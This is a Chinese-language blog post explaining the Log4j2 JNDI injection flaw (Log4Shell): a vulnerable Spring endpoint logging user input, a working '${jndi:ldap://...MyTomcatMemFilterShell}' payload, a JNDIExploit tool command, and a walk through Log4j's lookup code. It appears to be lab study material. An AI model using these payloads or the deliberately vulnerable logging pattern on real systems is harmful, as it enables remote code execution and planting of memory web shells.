---
title: log4j漏洞
date: 2026-01-30 08:46:10
updated: 2026-04-10 11:57:48
tags:
  - Web
  - java
  - 反序列化
---
## 1.什么是log4j？

Log4j 是 Apache 软件基金会维护的‌**开源 Java 日志记录框架**‌，用于实现应用程序运行时的日志管理功能。以下是其核心特性与组件解析：

---

### 1.1、核心功能

1.  ‌**日志输出控制**‌

-   支持将日志输出到多种目的地，包括控制台、文件、GUI组件、套接口服务器、NT事件记录器等‌12。

-   允许通过配置文件灵活调整日志行为，无需修改代码‌12。

2.  ‌**日志格式与级别管理**‌

-   可自定义每条日志的格式（如时间戳、日志级别、类名等）‌45。

-   提供六种日志级别（TRACE、DEBUG、INFO、WARN、ERROR、FATAL），支持按需过滤日志信息‌36。

---

### 1.2、核心组件

Log4j 由以下三个核心模块构成‌45：

1.  ‌\*\*Logger（日志记录器）\*\*‌

-   控制日志的输出级别（如DEBUG、ERROR）及是否输出日志。

-   支持分层结构（如`com.example.module`），便于按模块管理日志‌57。

2.  ‌\*\*Appender（附加器）\*\*‌

-   定义日志的输出位置（如控制台、文件、数据库等）。

-   支持同时配置多个输出目标（如同时输出到文件和网络）‌46。

3.  ‌\*\*Layout（格式化器）\*\*‌

-   控制日志的显示格式，例如：

```plain
<PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss} [%t] %-5level %logger{36} - %msg%n"/>
```

## 2.log4j应用到项目中

maven工程pom文件引入

```xml
<dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.8.2</version>
        </dependency>

        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.8.2</version>
        </dependency>
```

使用log4j打印错误日志。如果log4j的版本是（2.0-beta9~2.15.1）是存在漏洞

我们用的版本是2.8.2所以是存在漏洞的

```java
    //log4j
    @PostMapping(value = "/vul2")
    public String vul2(@RequestParam("q") String q) {
        System.out.println(q);
        logger.error(q);   //使用log4j打印错误日志。
        return "Log4j2 JNDI Injection";
    }
```

poc

```plain
${jndi:ldap://127.0.0.1:1389/Deserialization/FastJson1/MyTomcatMemFilterShell}
```

jndi工具下载地址：[https://github.com/Jeromeyoung/JNDIExploit-1](https://github.com/Jeromeyoung/JNDIExploit-1)

使用：

```bash
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 0.0.0.0
```

## 2.漏洞原理

只看 `logger.error("${jndi:rmi://127.0.0.1:1099/calc}");` 这段代码，首先会调用到 org.apache.logging.log4j.core.config.LoggerConfig#processLogEvent：

```java
private void processLogEvent(final LogEvent event, final LoggerConfigPredicate predicate) {
    event.setIncludeLocation(isIncludeLocation());
    if (predicate.allow(this)) {
        callAppenders(event);
    }
    logParent(event, predicate);
}
```

其中 LogEvent 结构如下：

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214174231.png)

encode 对应的事件，将 ${param} 里的 param 解析出来，org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender#tryAppend

```java
private void tryAppend(final LogEvent event) {
    if (Constants.ENABLE_DIRECT_ENCODERS) {
        directEncodeEvent(event);
    } else {
        writeByteArrayToManager(event);
    }
}

protected void directEncodeEvent(final LogEvent event) {
    getLayout().encode(event, manager);
    if (this.immediateFlush || event.isEndOfBatch()) {
        manager.flush();
    }
}
```

调用 org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable，将对应参数解析出结果。

```java
protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
                                    final int startPos, final int endPos) {
    final StrLookup resolver = getVariableResolver();
    if (resolver == null) {
        return null;
    }
    return resolver.lookup(event, variableName);
}
```

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175321.png)

和官方文档上是能够对应上的，即 log 里只解析前缀为 `date`、`jndi` 等的命令，本文的测试用例使用的是 `${jndi:rmi://127.0.0.1:1099/calc}`。

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175427.png?x-oss-process=style/yano)

解析出参数的结果， org.apache.logging.log4j.core.lookup.Interpolator#lookup

```java
@Override
public String lookup(final LogEvent event, String var) {
    if (var == null) {
        return null;
    }

    final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
    if (prefixPos >= 0) {
        final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);
        final String name = var.substring(prefixPos + 1);
        final StrLookup lookup = strLookupMap.get(prefix);
        if (lookup instanceof ConfigurationAware) {
            ((ConfigurationAware) lookup).setConfiguration(configuration);
        }
        String value = null;
        if (lookup != null) {
            value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);
        }

        if (value != null) {
            return value;
        }
        var = var.substring(prefixPos + 1);
    }
    if (defaultLookup != null) {
        return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var);
    }
    return null;
}
```

其核心是这段代码：

```java
value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);
```

org.apache.logging.log4j.core.lookup.JndiLookup#lookup

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175217.png)

接下来就是调用 javax.naming 的 JDK 相关代码，远程加载了 ExecCalc 类，在本地输出了 `open a Calculator!` 并启动了计算器。

# 扩展：JNDI[#](https://www.cnblogs.com/510602159-Yano/p/15689497.html#扩展jndi)

JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用 JNDI 在局域网上定位一台打印机，也可以用 JNDI 来定位数据库服务或一个远程 Java 对象。JNDI 底层支持 RMI 远程对象，RMI 注册的服务可以通过 JNDI 接口来访问和调用。

JNDI 是应用程序设计的 Api，JNDI 可以根据名字动态加载数据，支持的服务主要有以下几种：DNS、LDAP、 CORBA 对象服务、RMI 等等。

其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214184613.png)

# 危害是什么？[#](https://www.cnblogs.com/510602159-Yano/p/15689497.html#危害是什么)

1.  client 可以获取服务器的某些信息，通过 JNDI 远程加载类

2.  client 向服务器注入恶意代码